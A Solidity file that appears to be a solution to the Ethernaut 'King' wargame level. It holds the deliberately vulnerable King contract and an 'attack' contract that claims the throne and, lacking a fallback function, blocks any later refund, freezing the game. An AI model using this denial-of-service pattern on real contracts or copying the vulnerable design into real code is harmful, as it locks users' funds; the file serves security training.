// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
contract attack{
    
    function complete(address payable _addr)public payable{ 
        _addr.call{value:msg.value}("");
    }
    function reTran(address payable add)public{
        add.transfer(address(this).balance);
    }
//没有fallback函数 无法接受转账
}
